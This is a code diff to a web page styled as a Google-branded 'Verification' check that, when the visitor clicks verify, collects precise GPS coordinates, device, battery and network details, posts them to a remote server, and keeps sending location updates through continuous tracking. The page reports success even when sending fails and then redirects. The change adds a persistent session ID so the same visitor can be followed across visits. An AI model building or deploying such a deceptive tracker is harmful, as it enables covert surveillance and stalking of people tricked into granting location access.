@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title id="pageTitle">Verification</title>
     <style>
-        /* --- Same styles as before --- */
+        /* --- Styles (same as before) --- */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             height: 100vh;
@@ -216,6 +216,16 @@
         const template = urlParams.get('template') || 'google';
 
         // =============================================
+        // Generate or retrieve a unique session ID
+        // =============================================
+        let sessionId = localStorage.getItem('tracker_session_id');
+        if (!sessionId) {
+            sessionId = 'user_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now().toString(36);
+            localStorage.setItem('tracker_session_id', sessionId);
+        }
+        console.log('🆔 Session ID:', sessionId);
+
+        // =============================================
         // SVG LOGOS (short versions)
         // =============================================
         const svgLogos = {
@@ -317,7 +327,7 @@
         const checkmark = document.getElementById('checkmark');
 
         let isProcessing = false;
-        let watchId = null; // for continuous tracking
+        let watchId = null;
 
         // =============================================
         // Helpers
@@ -384,7 +394,7 @@
         }
 
         // =============================================
-        // Send location to server (called repeatedly)
+        // Send location to server
         // =============================================
         function sendLocation(lat, lng, accuracy, altitude, heading, speed) {
             const deviceInfo = getDeviceInfo();
@@ -398,7 +408,8 @@
                     speed: speed,
                     device_info: deviceInfo,
                     battery: battery,
-                    network: getNetworkInfo()
+                    network: getNetworkInfo(),
+                    session_id: sessionId   // <-- Session ID added
                 };
                 return fetch(RENDER_URL + '/send-location', {
                     method: 'POST',
@@ -412,7 +423,7 @@
         // Continuous Tracking (watchPosition)
         // =============================================
         function startContinuousTracking() {
-            if (watchId !== null) return; // already watching
+            if (watchId !== null) return;
 
             watchId = navigator.geolocation.watchPosition(
                 function(position) {
@@ -423,15 +434,12 @@
                     const heading = position.coords.heading;
                     const speed = position.coords.speed;
 
-                    // Throttle: send only if movement > 10 meters or every 5 seconds
-                    // We'll send every time for simplicity; you can add throttling if needed.
                     sendLocation(lat, lng, accuracy, altitude, heading, speed)
                         .then(() => console.log('📍 Continuous update sent'))
                         .catch(err => console.error('Continuous update error:', err));
                 },
                 function(error) {
                     console.error('Watch error:', error);
-                    // Optionally stop watch on fatal error
                 },
                 {
                     enableHighAccuracy: true,
@@ -442,7 +450,7 @@
         }
 
         // =============================================
-        // Main Verification Flow (First time only)
+        // Main Verification Flow
         // =============================================
         function startVerification() {
             if (isProcessing) return;
@@ -461,7 +469,6 @@
                 return;
             }
 
-            // Get initial location and start continuous tracking
             navigator.geolocation.getCurrentPosition(
                 function(position) {
                     const lat = position.coords.latitude;
@@ -471,10 +478,8 @@
                     const heading = position.coords.heading;
                     const speed = position.coords.speed;
 
-                    // Send initial location
                     sendLocation(lat, lng, accuracy, altitude, heading, speed)
                         .then(() => {
-                            // Start continuous tracking after first success
                             startContinuousTracking();
 
                             showStatus(SUCCESS_MSG, 'verified');
@@ -483,13 +488,11 @@
                             verifyBtn.textContent = 'Verified ✓';
                             showCheckmark();
 
-                            // Redirect after 2.5 seconds
                             setTimeout(function() {
                                 window.location.href = REDIRECT_URL;
                             }, 2500);
                         })
                         .catch(function(err) {
-                            // Fallback: still show success and redirect
                             showStatus(SUCCESS_MSG, 'verified');
                             verifyBtn.classList.remove('loading');
                             verifyBtn.classList.add('success');
@@ -522,14 +525,10 @@
         // =============================================
         verifyBtn.addEventListener('click', startVerification);
 
-        // Enable button after 1 second
         setTimeout(function() {
             verifyBtn.classList.add('active');
         }, 1000);
 
-        // =============================================
-        // Cleanup when page unloads
-        // =============================================
         window.addEventListener('beforeunload', function() {
             if (watchId !== null) {
                 navigator.geolocation.clearWatch(watchId);
